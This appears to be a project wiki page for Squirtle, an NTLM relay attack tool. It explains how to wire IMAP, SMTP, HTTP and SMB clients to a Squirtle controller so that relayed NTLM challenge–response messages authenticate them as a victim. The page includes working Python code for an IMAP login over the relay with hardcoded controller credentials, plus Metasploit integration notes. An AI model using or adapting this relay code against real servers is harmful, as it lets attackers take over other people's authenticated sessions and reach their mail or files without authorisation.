# Introduction #

This will mostly be a quick brain-dump from how to modify existing code to support the Squirtle API. In general any service that already supports the Base64 Type messages will be VERY easy to integrate, depending upon the language used.

Those apps that support SMB need some extra special things.

# The Easy Ones (Base64 Type Messages) #

In order to support NTLM authentication, protocols such as IMAP, SMTP, POP3, NNTP and HTTP simply extended their protocols or added headers to permit the three-level authentication of negotiate, credentialize and authenticate. These are the easiest to integrate with the Squirtle API as you only need to extend their support for NTLM to pass the Type 2 and Type 3 messages back and forth.

  * Step 1: Send a Type 1 message to the server
  * Step 2: Receive the Type 2 challenge from the server
  * Step 3: Pass that challenge to Squirtle with the Session Key to authenticate
  * Step 4: Wait for Squirtle to respond (could take 5 to 10 seconds depending upon timeout values)
  * Step 5: Pass the Type 3 response to the server

For example this is all handled within the following python function:

```
def process_type2(msg2, sqkey='', squri="http://localhost:8080/", squser="squirtle", sqpass="eltriuqs"):
  msg2 = urllib.quote(msg2)
  auth_handler = urllib2.HTTPBasicAuthHandler()
  auth_handler.add_password(realm='Squirtle Realm',
                            uri=squri,
                            user=squser,
                            passwd=sqpass)
  urlopener = urllib2.build_opener(auth_handler)
  urllib2.install_opener(urlopener)

  dutchieurl = "%scontroller/type2?key=%s&type2=%s" % (squri, sqkey, msg2)
  try:
    res = urllib2.urlopen(dutchieurl)
  except urllib2.URLError, e:
    print '*** Error talking to Squirtle.' + str(e.code) + ': ' + e.reason + '\n'
    return ''

  response = res.read()
  try:
    response = simplejson.loads(response)
  except Exception, e:
    print '*** Error receiving response from Squirtle: ' + response + '\n'
    return ''

  if response['status'] == 'ok':
    NTLM_msg3 = response['result']
  else:
    print '*** Response from Squirtle: ' + response['status'] + '\n'

  return NTLM_msg3

def login_squirtle(server, sqkey):
  """Login as a user using the Squirtle API"""

  typ, dat = server.capability()
  if not "NTLM" in str(dat):
    raise self.error("!!! IMAP server does not support NTLM !!!")

  server.send("0001 AUTHENTICATE NTLM\r\n")
  dat = server.readline()
  if "+" not in dat:
    raise server.error("!!! Did not receive IMAP challenge: %s" % (dat))

  # generic ntlm type 1 message
  server.send("TlRMTVNTUAABAAAABzIAAAYABgArAAAACwALACAAAABXT1JLU1RBVElPTkRPTUFJTg==\r\n")
  dat = server.readline()
  if "+" not in dat:
    raise server.error("!!! Invalid response: %s" % (dat))

  msg3 = process_type2(dat[2:].strip(), sqkey, "http://localhost:8080/", "squirtle", "eltriuqs")
  if len(msg3) > 0:
    server.send("%s\r\n" % msg3)
    dat = server.readline()
    if "0001 OK" not in dat:
      raise server.error("!!! Did not receive OK message: %s" % (dat))

    server.state = 'AUTH'
  else:
    raise server.error("!!! No response from Squirtle")
  return
```

# SMB Protocol Integration #

When modifying an SMB protocol application to integrate with Squirtle a number of issues have to be resolved:

  * Passing the correct flags between the server and client
  * Creating a valid Type 2 message to pass to the client
  * Ripping out the correct sections of the messages
  * Does your application support Signing/Sealing?

In the case of Metasploit, Signing/Sealing isn't supported (yet). Samba however does so its integration steps would be a bit more but in essence as long as the messages are correctly formed everything should pass nicely.

View the [msf3.2-testing diff](http://code.google.com/p/squirtle/source/browse/trunk/evilagents/msf32-squirtle.diff) for details on the integration. It's certainly much more involved but should give you a good insight as to the challenges.